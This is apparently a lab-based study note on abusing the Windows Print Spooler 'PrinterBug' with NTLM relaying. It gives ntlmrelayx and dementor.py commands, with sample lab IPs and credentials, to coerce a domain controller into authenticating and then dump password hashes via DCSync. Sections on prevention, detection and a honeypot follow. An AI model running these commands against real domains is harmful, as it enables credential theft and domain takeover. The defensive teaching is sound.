# Print Spooler & NTLM Relaying

* **Print Spooler** is an old service enabled by default on Windows systems (even latest versions).
* **PrinterBug** (found in 2018) abuses Print Spooler to force a remote machine to authenticate elsewhere, sending a TGT (ticket-granting ticket).
* Microsoft won't fix this—it's **"by design."**

If **Print Spooler is enabled** on a Domain Controller (DC), an attacker can:

1. **Relay** the connection to another DC and perform **DCSync** (dump user hashes).
2. **Connect to a machine with Unconstrained Delegation (UD)** – extract TGTs from memory (with Rubeus/Mimikatz).
3. **Abuse AD CS** – get a certificate for the DC, impersonate it.
4. **Abuse Resource-Based Kerberos Delegation** – authenticate as any admin.

***

## Attack

**Pre-condition:** SMB Signing must be **disabled** on the target DC.

**Step 1: Start NTLMRelayx to relay to the second Domain Controller.**

```
impacket-ntlmrelayx -t dcsync://<DC2_IP> -smb2support
```

<figure><img src="../../../.gitbook/assets/Pasted image 20250415100557.png" alt=""><figcaption></figcaption></figure>

**Step 2: Trigger the PrinterBug from a compromised user.**

```
python3 dementor.py <victim_DC_IP> <attacker_IP> -u <username> -d <domain> -p <password>
```

```
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
```

<figure><img src="../../../.gitbook/assets/Pasted image 20250415100434.png" alt=""><figcaption></figcaption></figure>

**Step 3: Wait for NTLMRelayx to catch the connection and perform DCSync.**

**Result:** You receive user password hashes from the second DC.

***

## Prevention

* **Disable Print Spooler** on all non-printing servers (especially DCs).
* Or block remote calls via registry:
  * `RegisterSpoolerRemoteRpcEndPoint = 2` (disables remote access)

<figure><img src="../../../.gitbook/assets/Pasted image 20250415100425.png" alt=""><figcaption></figcaption></figure>

***

## Detection

No specific logs for this, but:

* Monitor **logons from core servers**
* Correlate with **unexpected IP addresses**
* Look for successful logons from **Kali machine IP**

<figure><img src="../../../.gitbook/assets/Pasted image 20250415100414.png" alt=""><figcaption></figcaption></figure>

***

## Honeypot

* Block outbound 139/445 from DCs using firewall.
* This prevents reverse connection but **alerts you** if the bug is triggered.
* ⚠️ Only for **mature environments**, since unknown bugs could bypass this.
